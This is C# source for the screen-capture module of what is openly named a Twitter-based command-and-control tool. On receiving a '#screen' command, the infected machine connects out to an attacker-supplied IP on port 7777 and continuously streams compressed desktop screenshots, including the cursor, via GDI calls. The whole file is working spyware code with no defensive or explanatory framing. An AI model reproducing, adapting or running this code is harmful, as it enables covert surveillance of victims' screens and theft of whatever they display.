using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace TwitterCommandAndControl
{
    public static class ScreenCaptureHandler
    {
        private const int PORT = 7777;
        public static void Respond(string command)
        {
            NetworkStream networkStream = null;

            command = command.ToLower();
            if (command.Contains("#screen"))
            {
                var ip = command.Split('#').Where(x => x.StartsWith("ip=")).Select(x => x.Split('=')[1]).FirstOrDefault();
                try
                {
                    using (var tcpClient = new TcpClient())
                    {
                        tcpClient.Connect(ip, PORT);
                        using (networkStream = tcpClient.GetStream())
                        using (var gzipStream = new GZipStream(networkStream, CompressionMode.Compress))
                        using (var writer = new StreamWriter(gzipStream))
                        {
                            while (tcpClient.Connected)
                            {
                                using (var image = CaptureScreen.GetDesktopImage())
                                using (var memoryStream = new MemoryStream())
                                {
                                    image.Save(memoryStream, System.Drawing.Imaging.ImageFormat.Png);
                                    writer.WriteLine(System.Convert.ToBase64String(memoryStream.ToArray()));
                                    writer.Flush();
                                }
                                Thread.Sleep(1000 / 60);
                            }
                        }
                    }
                }
                catch { }
            }
        }

        public static TcpClient Request(string commandPrefix)
        {
            TcpClient client = null;
            var listenerTask = Task.Factory.StartNew(() =>
            {
                TcpListener listener = new TcpListener(IPAddress.Any, PORT);
                listener.Start();
                client = listener.AcceptTcpClient();
                listener.Stop();
            });
            Messenger.Send(commandPrefix + " #screen #ip=" + GetPublicIP.GetIP());
            listenerTask.Wait();
            return client;
        }

        #region Screen Capture Helper Classes
        private class PlatformInvokeGDI32
        {
            public const int SRCCOPY = 13369376;
            [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
            public static extern IntPtr DeleteDC(IntPtr hDc);

            [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
            public static extern IntPtr DeleteObject(IntPtr hDc);

            [DllImport("gdi32.dll", EntryPoint = "BitBlt")]
            public static extern bool BitBlt(IntPtr hdcDest, int xDest,
                int yDest, int wDest, int hDest, IntPtr hdcSource,
                int xSrc, int ySrc, int RasterOp);

            [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
            public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc,
                int nWidth, int nHeight);

            [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC")]
            public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

            [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
            public static extern IntPtr SelectObject(IntPtr hdc, IntPtr bmp);
        }

        private class PlatformInvokeUSER32
        {
            [StructLayout(LayoutKind.Sequential)]
            public struct CURSORINFO
            {
                public Int32 cbSize;
                public Int32 flags;
                public IntPtr hCursor;
                public POINTAPI ptScreenPos;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct POINTAPI
            {
                public int x;
                public int y;
            }

            public const int SM_CXSCREEN = 0;
            public const int SM_CYSCREEN = 1;

            [DllImport("user32.dll", EntryPoint = "GetDesktopWindow")]
            public static extern IntPtr GetDesktopWindow();

            [DllImport("user32.dll", EntryPoint = "GetDC")]
            public static extern IntPtr GetDC(IntPtr ptr);

            [DllImport("user32.dll", EntryPoint = "GetSystemMetrics")]
            public static extern int GetSystemMetrics(int abc);

            [DllImport("user32.dll", EntryPoint = "GetWindowDC")]
            public static extern IntPtr GetWindowDC(Int32 ptr);

            [DllImport("user32.dll", EntryPoint = "ReleaseDC")]
            public static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDc);

            [DllImport("user32.dll", EntryPoint = "GetCursorInfo")]
            public static extern bool GetCursorInfo(out CURSORINFO pci);

            [DllImport("user32.dll", EntryPoint = "DrawIcon")]
            public static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);
        }

        private class CaptureScreen
        {
            const Int32 CURSOR_SHOWING = 0x00000001;

            public static Bitmap GetDesktopImage()
            {
                SIZE size;
                IntPtr hBitmap;
                IntPtr hDC = PlatformInvokeUSER32.GetDC
                              (PlatformInvokeUSER32.GetDesktopWindow());
                IntPtr hMemDC = PlatformInvokeGDI32.CreateCompatibleDC(hDC);
                size.cx = PlatformInvokeUSER32.GetSystemMetrics
                          (PlatformInvokeUSER32.SM_CXSCREEN);
                size.cy = PlatformInvokeUSER32.GetSystemMetrics
                          (PlatformInvokeUSER32.SM_CYSCREEN);
                hBitmap = PlatformInvokeGDI32.CreateCompatibleBitmap
                            (hDC, size.cx, size.cy);
                if (hBitmap != IntPtr.Zero)
                {
                    IntPtr hOld = (IntPtr)PlatformInvokeGDI32.SelectObject
                                           (hMemDC, hBitmap);
                    PlatformInvokeGDI32.BitBlt(hMemDC, 0, 0, size.cx, size.cy, hDC,
                                               0, 0, PlatformInvokeGDI32.SRCCOPY);
                    PlatformInvokeGDI32.SelectObject(hMemDC, hOld);
                    PlatformInvokeGDI32.DeleteDC(hMemDC);
                    PlatformInvokeUSER32.ReleaseDC(PlatformInvokeUSER32.
                                                   GetDesktopWindow(), hDC);
                    Bitmap bmp = System.Drawing.Image.FromHbitmap(hBitmap);
                    PlatformInvokeGDI32.DeleteObject(hBitmap);
                    using (Graphics g = Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(0, 0, 0, 0, new Size(size.cx, size.cy), CopyPixelOperation.SourceCopy);

                        PlatformInvokeUSER32.CURSORINFO pci;
                        pci.cbSize = System.Runtime.InteropServices.Marshal.SizeOf(typeof(PlatformInvokeUSER32.CURSORINFO));
                        if (PlatformInvokeUSER32.GetCursorInfo(out pci))
                        {
                            if (pci.flags == CURSOR_SHOWING)
                            {
                                PlatformInvokeUSER32.DrawIcon(g.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
                                g.ReleaseHdc();
                            }
                        }
                    }

                    GC.Collect();
                    return bmp;
                }
                return null;
            }


            public struct SIZE
            {
                public int cx;
                public int cy;
            }
        }
        #endregion
    }
}